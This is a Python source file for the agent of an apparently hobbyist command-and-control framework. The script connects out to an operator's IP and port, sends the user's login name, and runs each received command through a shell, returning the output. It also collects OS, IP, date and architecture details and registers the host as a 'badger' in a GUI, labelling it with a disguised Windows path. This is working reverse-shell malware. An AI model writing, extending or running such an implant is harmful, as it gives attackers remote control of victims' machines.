#!/usr/bin/python3

import socket, subprocess,os,sys,readline
from colorama import init,Fore
# from teamserver import update_badger_terminal
import subprocess
from PyQt6.QtWidgets import QApplication
from c2front5 import Ui_MainWindow, badgerterminal
from c2front5 import Ui_MainWindow
app = QApplication(sys.argv)
main_window = Ui_MainWindow()
import json


def update_badger_terminal(commands):
    # app = QApplication(sys.argv)
    # main_window = Ui_MainWindow()

   


    os = subprocess.run(commands[0],shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    date = subprocess.run(commands[1],shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    ip = subprocess.run(commands[2],shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    Arc = subprocess.run(commands[3],shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    elements_badger = [tar_ip, ip.stdout.strip(), "x-0", os.stdout.strip(), "LLM" , date.stdout.strip() , "1364" , "9068" , "C:\\Windows\\system32\\LLM-Agent.exe", Arc.stdout.strip(), Arc.stdout.strip() , "Direct", "NULL"]

        
    badger_terminal_instance = badgerterminal()

    badger_terminal_instance.add_bagders(elements_badger)

init()
GREEN = Fore.GREEN
RESET = Fore.RESET
GRAY = Fore.LIGHTBLACK_EX
RED = Fore.RED
BLUE = Fore.BLUE

def inbound():
    print(f'{GREEN}[+] Awaiting response...')
    meg = ''
    while True:
        try:
            meg = sock.recv(1024).decode()
            return (meg)   # or return meg you can not list directory
        except Exception:
            sock.close()
        
def outbound(meg):
    sock.send(str(meg).encode())

def session_headler():
    print(f"{GREEN}[+] Connecting to {tar_ip} : {tar_port}")
    sock.connect((tar_ip, tar_port))
    outbound(os.getlogin())
    print(f"{GREEN}[+] Connected to {tar_ip} : {tar_port}")
    
    while True:
        try:
            meg = inbound()
            print(f'{GREEN}[+] Message received - {meg}')
            
            if meg == 'exit':
                print('[-] The server has terminated the session.') 
                # sock.send(meg.encode())
                sock.close()
                break
            
            elif meg.split(" ")[0] == 'cd':
                try: 
                    directory = str(meg.split(" ")[1])
                    os.chdir(directory)
                    cur_dir = os.getcwd()
                    print(f"{GREEN}[+] Changed to {cur_dir}")
                    # sock.send(cur_dir.encode())
                    outbound(cur_dir)
                except FileNotFoundError:
                    outbound("Invalid dir, Try again!")
                    continue
            elif meg == 'back':
                pass
            else:
                command = subprocess.Popen(meg, shell=True, stdout = subprocess.PIPE, stderr=subprocess.PIPE)
                output = command.stdout.read() + command.stderr.read()
                outbound(output.decode())
         

        except KeyboardInterrupt:
            print("\nYou hit ctrl + c, Exiting the C2............") 
            sock.close()
            break
        
        except Exception:
            sock.close()
            break





if __name__ == "__main__":
    # ui = Ui_MainWindow()

    # ui.event_log_widget.insertHtml(f"<b style='color:#8dffff;'></b> <pre style='color: #8dffff;'>{info}<</pre><br>")

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    commands = [
                    """cat /etc/os-release | grep '^PRETTY_NAME=' | awk -F '"' '{print $2}'""",       # OS Version
                    "date",                      # System Date & Time
                    "ifconfig ens33 | grep 'inet ' | awk '{print $2}'",
                    "uname -i"
            ]

    if len(sys.argv) == 3:
        print("Usage: python3 client.py 127.0.0.1 2222")
        
        tar_ip = sys.argv[1]
        tar_port = int(sys.argv[2])
        session_headler()

    else:
        tar_ip = subprocess.run(commands[2],shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        tar_ip  = str(tar_ip.stdout.strip())
        tar_port = 8080
        update_badger_terminal(commands)
        session_headler()

   


    # ui.web_activity_widget.insertHtml(f"<b style='color:#8dffff;'></b> <pre style='color: #8dffff;'>{info}<</pre><br>")

    

